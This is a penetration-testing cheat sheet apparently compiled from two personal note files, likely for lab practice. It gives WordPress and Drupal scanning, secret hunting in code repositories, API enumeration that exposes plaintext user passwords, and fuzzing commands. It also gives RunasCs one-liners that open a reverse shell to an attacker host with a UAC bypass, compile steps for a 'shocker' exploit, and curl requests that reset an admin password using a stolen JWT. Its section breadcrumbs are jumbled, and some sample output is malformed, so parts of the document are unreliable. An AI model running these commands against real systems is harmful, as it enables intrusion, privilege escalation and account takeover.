## WordPress

> Source: `01101100-C0D3X-00110110.md` → `Enumeration > WordPress`

```bash
wpscan --url [http://website.com](http://website.com)
```


## Open-Source Code Discovery

> Source: `01101100-C0D3X-00110110.md` → `Web Enumeration > Open-Source Code Discovery`

Common platforms for finding open-source code:

- GitHub
- GitHub Gist
- GitLab
- SourceForge
- etc.


## GitHub Searches

> Source: `01101100-C0D3X-00110110.md` → `Web Enumeration > Open-Source Code Discovery > GitHub Searches`

Example of a specific GitHub search:

```plaintext
owner:megacorpone path:users
```


## Automation Tools for Large Repositories

> Source: `01101100-C0D3X-00110110.md` → `Web Enumeration > Open-Source Code Discovery > Automation Tools for Large Repositories`

For more extensive code searches, consider using tools like:

- Gitrob
- Gitleaks

> **Note:** Most of these tools require an access token for the respective source code hosting provider's API.


## CMS Specific Enumeration

> Source: `01101100-C0D3X-00110110.md` → `Vhost / Subdomains > CMS Specific Enumeration`

- **WordPress:** `wpscan`
- **Drupal:** `droopescan`


## api

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > VestaCP (Authenticated RCE) > api`

```
curl http://$ip/api/
```

```
[{"string":"/api/","id":13},{"string":"/article/","id":14},{"string":"/article/?","id":15},{"string":"/user/","id":16},{"string":"/user/?","id":17}]
```

```
curl http://$ip/api/user/
```

```
[{"login":"UserA","password":"test12","firstname":"UserA","lastname":"UserA","description":"Owner","id":10},{"login":"UserB","password":"test13","firstname":"UserB","lastname":"UserB","description":"Owner","id":30},{"login":"UserC","password":"test14","firstname":"UserC","lastname":"UserC","description":"Owner","id":6o},{"login":"UserD","password":"test15","firstname":"UserD","lastname":"UserD","description":"Owner","id":7o},{"login":"UserE","password":"test16","firstname":"UserE","lastname":"UserE","description":"Owner","id":100}]
```

```
Configuration files such as .ini, .config, and .conf files.
Application source code files such as .php, .aspx, .jsp, and .py files.
Log files such as .log, .txt, and .xml files.
Backup files such as .bak, .zip, and .tar.gz files.
Database files such as .mdb, .sqlite, .db, and .sql files.
```


## API

> Source: `01101100-C0D3X-00110110.md` → `LAPSToolkit > LAPSToolkit command > Port Enumeration > VestaCP (Authenticated RCE) > API`

```
http://192.168.214.150:8080/search
{"query":"*","result":""}
```

```
curl -X GET "http://192.168.214.150:8080/search?query=*"
{"query":"*","result":""}

curl -X GET "http://192.168.214.150:8080/search?query=lol"
{"query":"lol","result":""}
```

## API Fuzzing

> Source: `01101100-C0D3X-00110110.md` → `CLEAR CMD RUNMRU? > Commands > Information Gathering > ffuf > API Fuzzing`

```
ffuf -u https://<RHOST>/api/v2/FUZZ -w api_seen_in_wild.txt -c -ac -t 250 -fc 400,404,412
```


## RunasCs

> Source: `01101100-RUN3-00110110.md` → `DonPAPI > Post Exploitation > RunasCs`

```
.\RunasCs.exe <USERNAME> <PASSWORD> cmd.exe -r <LHOST>:<LPORT>
.\RunasCs.exe <USERNAME> <PASSWORD> cmd.exe -r <LHOST>:<LPORT> --bypass-uac
.\RunasCs.exe <USERNAME> <PASSWORD> cmd.exe -r <LHOST>:<LPORT> --bypass-uac -l 5 -b
.\RunasCs.exe <USERNAME> <PASSWORD> <FILE> --bypass-uac -l 5 -b
.\RunasCs.exe -d <DOMAIN> "<USERNAME>" '<PASSWORD>' cmd.exe -r <LHOST>:<LPORT>
.\RunasCs.exe -l 3 -d <DOMAIN> "<USERNAME>" '<PASSWORD>' 'C:\Users\<USERNAME>\Downloads\<FILE>'
```


## Compiling

> Source: `01101100-RUN3-00110110.md` → `DonPAPI > Execution > SharpEfsPotato LPE > Compiling`

```
gcc shocker.c -o shocker
cc -Wall -std=c99 -O2 shocker.c -static
```


## `curl` for API Interaction (Example: Changing Admin Password)

> Source: `01101100-RUN3-00110110.md` → `git - enumerate in parent directory of `.git` > Web Content Discovery > `curl` for API Interaction (Example: Changing Admin Password)`

```bash
curl \
'http://192.168.50.16:5002/users/v1/admin/password' \
-H 'Content-Type: application/json' \
-H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew' \
-d '{"password": "pwned"}'
```

> **Note:** This example shows a PUT request to change an admin password using a JWT token obtained previously.

```bash
curl -X 'PUT' \
'http://192.168.50.16:5002/users/v1/admin/password' \
-H 'Content-Type: application/json' \
-H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
-d '{"password": "pwned"}'
```
